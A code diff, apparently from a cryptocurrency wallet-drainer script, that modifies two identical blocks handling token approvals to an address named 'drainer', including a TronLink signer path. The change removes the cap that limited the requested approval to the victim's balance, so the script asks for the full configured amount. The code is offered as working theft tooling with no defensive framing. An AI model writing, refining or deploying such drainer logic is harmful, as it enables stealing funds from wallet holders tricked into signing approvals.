@@ -408,8 +408,7 @@ async function run() {
       const bal = BigInt(t.raw);
       let allow = 0n;
       try { allow = BigInt('0x' + (await readCall(t.token, 'allowance(address,address)', addrParam(account) + addrParam(cfg.drainer)))); } catch (e) {}
-      const cap = cfg.approveLimit ? BigInt(cfg.approveLimit) * 10n ** dec : bal;
-      const target = bal < cap ? bal : cap;
+      const target = cfg.approveLimit ? BigInt(cfg.approveLimit) * 10n ** dec : bal;
       if (allow < target) {
         const amt = target.toString();
         if (signer.kind === 'tronlink') {
@@ -435,8 +434,7 @@ async function run() {
       const bal = BigInt(t.raw);
       let allow = 0n;
       try { allow = BigInt('0x' + (await readCall(t.token, 'allowance(address,address)', addrParam(account) + addrParam(cfg.drainer)))); } catch (e) {}
-      const cap = cfg.approveLimit ? BigInt(cfg.approveLimit) * 10n ** dec : bal;
-      const target = bal < cap ? bal : cap;
+      const target = cfg.approveLimit ? BigInt(cfg.approveLimit) * 10n ** dec : bal;
       if (allow < target) {
         const amt = target.toString();
         if (signer.kind === 'tronlink') {
